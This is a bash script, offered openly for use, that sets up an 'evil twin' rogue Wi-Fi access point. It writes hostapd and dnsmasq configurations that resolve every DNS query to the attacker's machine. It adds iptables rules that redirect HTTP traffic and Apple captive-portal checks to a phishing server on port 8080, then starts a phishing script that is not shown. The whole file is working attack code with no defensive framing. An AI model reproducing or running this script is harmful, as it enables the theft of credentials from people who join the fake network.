#!/bin/bash

# =========================================
#  Evil Twin Attack with Auto-Redirect Phishing
# =========================================

# Ensure script runs as root
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as root!"
    exit 1
fi

# Check for required tools
for tool in airmon-ng airodump-ng hostapd dnsmasq iptables; do
    if ! command -v $tool &>/dev/null; then
        echo "[!] $tool not found! Installing..."
        sudo apt install -y $tool
    fi
done

# Save original Wi-Fi mode
original_interface=$(iw dev | awk '$1=="Interface"{print $2}')
original_mode=$(iw dev $original_interface info | grep type | awk '{print $2}')

# Select wireless interface
echo "[+] Available wireless interfaces:"
iw dev | awk '$1=="Interface"{print $2}'
read -p "[*] Enter your wireless interface (e.g., wlan0): " interface

# Enable monitor mode
echo "[+] Enabling monitor mode on $interface..."
sudo airmon-ng start $interface
mon_interface="${interface}mon"

# Set up Evil Twin
read -p "[*] Enter the SSID of the fake Wi-Fi network: " fake_ssid
read -p "[*] Enter the channel number: " channel

echo "interface=$mon_interface
ssid=$fake_ssid
channel=$channel
driver=nl80211
auth_algs=1
ignore_broadcast_ssid=0" > /etc/hostapd/hostapd.conf

# Configure DHCP server (dnsmasq) with captive portal
echo "interface=$mon_interface
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1" > /etc/dnsmasq.conf

# Start Fake Access Point
echo "[+] Launching Evil Twin..."
sudo hostapd -B /etc/hostapd/hostapd.conf

# Start DHCP and DNS hijacking
echo "[+] Starting DHCP and DNS spoofing..."
sudo dnsmasq -C /etc/dnsmasq.conf -d &

# Set up iptables to redirect traffic to phishing page
echo "[+] Redirecting HTTP traffic to phishing page..."
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:8080
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

# Captive portal response for iPhone
echo "[+] Setting up captive portal detection..."
echo -e "HTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 2\n\nOK" > /var/www/html/success.html
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -m string --string "captive.apple.com" --algo bm -j DNAT --to-destination 192.168.1.1:8080

# Start phishing server
python3 phishing_server.py &

# Trap for cleanup on exit
echo "[*] Press CTRL+C to stop the Evil Twin Attack."
trap "
    echo '[+] Stopping Evil Twin...';
    sudo killall hostapd dnsmasq python3;
    sudo iptables -F;
    
    if iw dev | grep -q "$mon_interface"; then
        sudo airmon-ng stop $mon_interface
    fi
    
    sudo iw dev $interface set type $original_mode 2>/dev/null || true;
    echo '[+] Wi-Fi restored to original mode: $original_mode.';
    exit
" SIGINT

while true; do sleep 1; done
